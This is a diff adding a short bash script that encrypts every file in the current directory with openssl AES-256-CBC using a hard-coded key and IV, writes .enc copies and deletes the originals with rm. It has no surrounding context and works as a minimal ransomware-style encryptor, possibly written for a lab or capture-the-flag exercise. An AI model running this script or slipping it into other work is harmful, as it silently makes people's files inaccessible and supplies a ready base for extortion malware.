@@ -1,0 +1,10 @@
+#!/bin/bash
+
+for f in *.*;
+do
+   openssl enc -aes-256-cbc -nosalt -e \
+	-in "$f" -out "${f}.enc" \
+	-K '659FE885E69BF7D0BF894D8881C680AE7EDD6DB83B4B4EBB0AF7C9C79CB97F9E' \
+	-iv '2080A264B1C9DDBDF4C01B1CA6E35D3E';
+   rm "$f"
+done
